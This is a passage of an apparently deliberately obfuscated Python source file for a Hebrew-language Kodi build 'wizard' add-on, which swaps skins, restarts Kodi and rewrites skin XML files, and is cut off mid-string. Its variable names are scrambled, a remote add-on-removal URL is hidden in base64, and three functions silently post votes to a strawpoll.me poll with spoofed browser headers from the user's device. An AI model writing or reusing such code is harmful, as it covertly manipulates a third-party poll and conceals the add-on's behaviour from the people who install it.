# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:39
ADDONTITLE =uservar .ADDONTITLE #line:40
ADDON =wiz .addonId (ADDON_ID )#line:41
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:42
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:43
DIALOG =xbmcgui .Dialog ()#line:44
DP =xbmcgui .DialogProgress ()#line:45
HOME =xbmc .translatePath ('special://home/')#line:46
LOG =xbmc .translatePath ('special://logpath/')#line:47
PROFILE =xbmc .translatePath ('special://profile/')#line:48
ADDONS =os .path .join (HOME ,'addons')#line:49
USERDATA =os .path .join (HOME ,'userdata')#line:50
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:51
PACKAGES =os .path .join (ADDONS ,'packages')#line:52
ADDOND =os .path .join (USERDATA ,'addon_data')#line:53
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:54
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:55
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:56
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:57
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:58
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:59
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:60
DATABASE =os .path .join (USERDATA ,'Database')#line:61
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:62
ICON =os .path .join (ADDONPATH ,'icon.png')#line:63
ART =os .path .join (ADDONPATH ,'resources','art')#line:64
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:65
DP2 =xbmcgui .DialogProgressBG ()#line:66
SKIN =xbmc .getSkinDir ()#line:67
BUILDNAME =wiz .getS ('buildname')#line:68
DEFAULTSKIN =wiz .getS ('defaultskin')#line:69
DEFAULTNAME =wiz .getS ('defaultskinname')#line:70
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:71
BUILDVERSION =wiz .getS ('buildversion')#line:72
BUILDTHEME =wiz .getS ('buildtheme')#line:73
BUILDLATEST =wiz .getS ('latestversion')#line:74
INSTALLMETHOD =wiz .getS ('installmethod')#line:75
SHOW15 =wiz .getS ('show15')#line:76
SHOW16 =wiz .getS ('show16')#line:77
SHOW17 =wiz .getS ('show17')#line:78
SHOW18 =wiz .getS ('show18')#line:79
SHOWADULT =wiz .getS ('adult')#line:80
SHOWMAINT =wiz .getS ('showmaint')#line:81
AUTOCLEANUP =wiz .getS ('autoclean')#line:82
AUTOCACHE =wiz .getS ('clearcache')#line:83
AUTOPACKAGES =wiz .getS ('clearpackages')#line:84
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:85
AUTOFEQ =wiz .getS ('autocleanfeq')#line:86
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:87
INCLUDENAN =wiz .getS ('includenan')#line:88
INCLUDEURL =wiz .getS ('includeurl')#line:89
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:90
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:91
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:92
INCLUDEVIDEO =wiz .getS ('includevideo')#line:93
INCLUDEALL =wiz .getS ('includeall')#line:94
INCLUDEBOB =wiz .getS ('includebob')#line:95
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:96
INCLUDESPECTO =wiz .getS ('includespecto')#line:97
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:98
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:99
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:100
INCLUDESALTS =wiz .getS ('includesalts')#line:101
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:102
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:103
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:104
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:105
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:106
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:107
INCLUDEURANUS =wiz .getS ('includeuranus')#line:108
SEPERATE =wiz .getS ('seperate')#line:109
NOTIFY =wiz .getS ('notify')#line:110
NOTEDISMISS =wiz .getS ('notedismiss')#line:111
NOTEID =wiz .getS ('noteid')#line:112
NOTIFY2 =wiz .getS ('notify2')#line:113
NOTEID2 =wiz .getS ('noteid2')#line:114
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:115
NOTIFY3 =wiz .getS ('notify3')#line:116
NOTEID3 =wiz .getS ('noteid3')#line:117
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:118
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:119
TRAKTSAVE =wiz .getS ('traktlastsave')#line:120
REALSAVE =wiz .getS ('debridlastsave')#line:121
LOGINSAVE =wiz .getS ('loginlastsave')#line:122
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:123
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:124
KEEPINFO =wiz .getS ('keepinfo')#line:125
KEEPSOUND =wiz .getS ('keepsound')#line:127
KEEPVIEW =wiz .getS ('keepview')#line:128
KEEPSKIN =wiz .getS ('keepskin')#line:129
KEEPADDONS =wiz .getS ('keepaddons')#line:130
KEEPSKIN2 =wiz .getS ('keepskin2')#line:131
KEEPSKIN3 =wiz .getS ('keepskin3')#line:132
KEEPTORNET =wiz .getS ('keeptornet')#line:133
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:134
KEEPPVR =wiz .getS ('keeppvr')#line:135
ENABLE =uservar .ENABLE #line:136
KEEPVICTORY =wiz .getS ('keepvictory')#line:137
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 =''#line:252
IPTVSIMPL18PC =''#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	O00OO0OOO0OOO0OO0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	OOOOO0OOO0OOOO0O0 =[];OO0OO0O000O0OO0O0 =[]#line:266
	for OOO0OOOOOOO0OO000 in sorted (O00OO0OOO0OOO0OO0 ,key =lambda OO0O0OO0O0O000OO0 :OO0O0OO0O0O000OO0 ):#line:267
		O0O0OO000OO00000O =os .path .split (OOO0OOOOOOO0OO000 [:-1 ])[1 ]#line:268
		OO000OO0OO00OO0OO =os .path .join (OOO0OOOOOOO0OO000 ,'addon.xml')#line:269
		if os .path .exists (OO000OO0OO00OO0OO ):#line:270
			OOO0000OOO0OO0O0O =open (OO000OO0OO00OO0OO )#line:271
			OOOOO0O000O00O0O0 =OOO0000OOO0OO0O0O .read ()#line:272
			OOOOOO00O0O00OO0O =parseDOM2 (OOOOO0O000O00O0O0 ,'addon',ret ='id')#line:273
			O00OOO00000O00O00 =O0O0OO000OO00000O if len (OOOOOO00O0O00OO0O )==0 else OOOOOO00O0O00OO0O [0 ]#line:274
			try :#line:275
				OO0O0OO0OOO0OOO00 =xbmcaddon .Addon (id =O00OOO00000O00O00 )#line:276
				OOOOO0OOO0OOOO0O0 .append (OO0O0OO0OOO0OOO00 .getAddonInfo ('name'))#line:277
				OO0OO0O000O0OO0O0 .append (O00OOO00000O00O00 )#line:278
			except :#line:279
				pass #line:280
	O0000OOO000OOO00O =[];O00OO0OOO0OOO0O0O =0 #line:281
	O00OO0O00O00OO0O0 =["Current Skin -- %s"%currSkin ()]+OOOOO0OOO0OOOO0O0 #line:282
	O00OO0OOO0OOO0O0O =DIALOG .select ("Select the Skin you want to swap with.",O00OO0O00O00OO0O0 )#line:283
	if O00OO0OOO0OOO0O0O ==-1 :return #line:284
	else :#line:285
		OOO00OOO0OOOO0O0O =(O00OO0OOO0OOO0O0O -1 )#line:286
		O0000OOO000OOO00O .append (OOO00OOO0OOOO0O0O )#line:287
		O00OO0O00O00OO0O0 [O00OO0OOO0OOO0O0O ]="%s"%(OOOOO0OOO0OOOO0O0 [OOO00OOO0OOOO0O0O ])#line:288
	if O0000OOO000OOO00O ==None :return #line:289
	for OO0OOO0OOOOO0OOO0 in O0000OOO000OOO00O :#line:290
		swapSkins (OO0OO0O000O0OO0O0 [OO0OOO0OOOOO0OOO0 ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (O00OOO00O0O0OO000 ,title ="Error"):#line:295
	OOOOOOO00OOO0OOO0 ='lookandfeel.skin'#line:296
	OO0OOOO00000O0000 =O00OOO00O0O0OO000 #line:297
	O00O00O00O00O000O =getOld (OOOOOOO00OOO0OOO0 )#line:298
	O00OOOOO0000000OO =OOOOOOO00OOO0OOO0 #line:299
	setNew (O00OOOOO0000000OO ,OO0OOOO00000O0000 )#line:300
	OOO00O0OOOO00000O =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO00O0OOOO00000O <100 :#line:302
		OOO00O0OOOO00000O +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (O0OOOOO00O00OOOOO ):#line:309
	try :#line:310
		O0OOOOO00O00OOOOO ='"%s"'%O0OOOOO00O00OOOOO #line:311
		OOO0OOO00O00O0O0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OOOOO00O00OOOOO )#line:312
		O000O0OO0OO0O000O =xbmc .executeJSONRPC (OOO0OOO00O00O0O0O )#line:314
		O000O0OO0OO0O000O =simplejson .loads (O000O0OO0OO0O000O )#line:315
		if O000O0OO0OO0O000O .has_key ('result'):#line:316
			if O000O0OO0OO0O000O ['result'].has_key ('value'):#line:317
				return O000O0OO0OO0O000O ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (OOO0O0O00O0O00O0O ,OOOO0O0O000O0OO0O ):#line:324
	try :#line:325
		OOO0O0O00O0O00O0O ='"%s"'%OOO0O0O00O0O00O0O #line:326
		OOOO0O0O000O0OO0O ='"%s"'%OOOO0O0O000O0OO0O #line:327
		OOO00OOO0O00O0000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO0O0O00O0O00O0O ,OOOO0O0O000O0OO0O )#line:328
		O00OO0O0O00OOOO0O =xbmc .executeJSONRPC (OOO00OOO0O00O0000 )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			OOOO0OO00OOO0OO0O =xbmcgui .DialogProgress ()#line:339
			OOOO0OO00OOO0OO0O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			OOOO0OO00OOO0OO0O .update (0 )#line:343
			for OOOO0OOOO000000OO in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				OOOO0OO00OOO0OO0O .update (int ((5 -OOOO0OOOO000000OO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OOOO0OOOO000000OO ),'')#line:346
				if OOOO0OO00OOO0OO0O .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			OOOO0OO00OOO0OO0O =xbmcgui .DialogProgress ()#line:352
			OOOO0OO00OOO0OO0O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			OOOO0OO00OOO0OO0O .update (0 )#line:356
			for OOOO0OOOO000000OO in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				OOOO0OO00OOO0OO0O .update (int ((5 -OOOO0OOOO000000OO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOOO0OOOO000000OO ),'')#line:359
				if OOOO0OO00OOO0OO0O .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    OOO0OO0O0OO0000OO ='18773068'#line:372
    OOOO0OOOO0OO0OOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO0OO0O0OO0000OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    O0OO00000O00OOO0O ='145273320'#line:386
    OOOOOO000000OOOO0 ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        O000O00O0OOO00O0O =O0OO00000O00OOO0O #line:389
    else :#line:390
        O000O00O0OOO00O0O =OOOOOO000000OOOO0 #line:391
    O00O0000O00OO0OOO ={'options':O000O00O0OOO00O0O }#line:395
    O0O0OOOO0OOOO0000 =requests .post ('https://www.strawpoll.me/'+OOO0OO0O0OO0000OO ,headers =OOOO0OOOO0OO0OOOO ,data =O00O0000O00OO0OOO )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        O00OOOO00OOO000O0 ='18773068'#line:401
        OOOO0O0O00000OOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OOOO00OOO000O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        O0OOOOOO0O0000000 ='145273320'#line:415
        OOO0000O000OO0OOO ={'options':O0OOOOOO0O0000000 }#line:421
        OOOO000O0O000O0OO =requests .post ('https://www.strawpoll.me/'+O00OOOO00OOO000O0 ,headers =OOOO0O0O00000OOOO ,data =OOO0000O000OO0OOO )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        OO0OO0OO00O000O00 ='18773068'#line:428
        O0O00OOO000O0OOO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0OO0OO00O000O00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        OOOO000O0O0O0OO0O ='145273321'#line:442
        OOO0OO000O0OO000O ={'options':OOOO000O0O0O0OO0O }#line:448
        OO0OOO0OO0OOO0000 =requests .post ('https://www.strawpoll.me/'+OO0OO0OO00O000O00 ,headers =O0O00OOO000O0OOO0 ,data =OOO0OO000O0OO000O )#line:450
   except :pass #line:451
def kodi17to18 ():#line:454
  if KODIV >=18 :#line:456
    OOOO00OO00O0O00OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:458
    with open (OOOO00OO00O0O00OO ,'r')as OO0OO0O000OO00O00 :#line:459
      O0OOO00O00OOOOOOO =OO0OO0O000OO00O00 .read ()#line:460
    O0OOO00O00OOOOOOO =O0OOO00O00OOOOOOO .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.12.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''','''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.14.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''')#line:507
    with open (OOOO00OO00O0O00OO ,'w')as OO0OO0O000OO00O00 :#line:510
      OO0OO0O000OO00O00 .write (O0OOO00O00OOOOOOO )#line:511
    OOOO00OO00O0O00OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:517
    with open (OOOO00OO00O0O00OO ,'r')as OO0OO0O000OO00O00 :#line:518
      O0OOO00O00OOOOOOO =OO0OO0O000OO00O00 .read ()#line:519
    O0OOO00O00OOOOOOO =O0OOO00O00OOOOOOO .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">9</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <control type="grouplist" id="9">
                        <ondown>9</ondown>
                        <onup>9</onup>
                        <onleft>8000</onleft>
                        <onright>2</onright>
                        <width>100%</width>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
                    <control type="grouplist" id="2">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>9</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 
                
            </control>

            <!-- Default Templates -->
            <control type="button" id="3">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="4">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="5">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="6">
                <width>100%</width>
                <height>69</height>
                <texture colordiffuse="PosterBorder">common/white.png</texture>
                <include>Defs_OptionButton</include>
                <visible>false</visible>
            </control>
            <control type="label" id="7">
                <width>100%</width>
                <height>69</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>blue</textcolor>
            </control>
            <control type="sliderex" id="8">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
			<control type="button" id="13">
				<description>default Section Button</description>
				<width>400</width>
				<height>62</height>
				<align>center</align>
        <texturenofocus colordiffuse="PosterBorder">common/white.png</texturenofocus>
        <texturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</texturefocus>
        <alttexturenofocus colordiffuse="PosterBorder">common/white.png</alttexturenofocus>
        <alttexturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</alttexturefocus>
			</control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onup>2</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="10">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="11">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="12">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>

    </controls>

</window>
''','''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">3</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
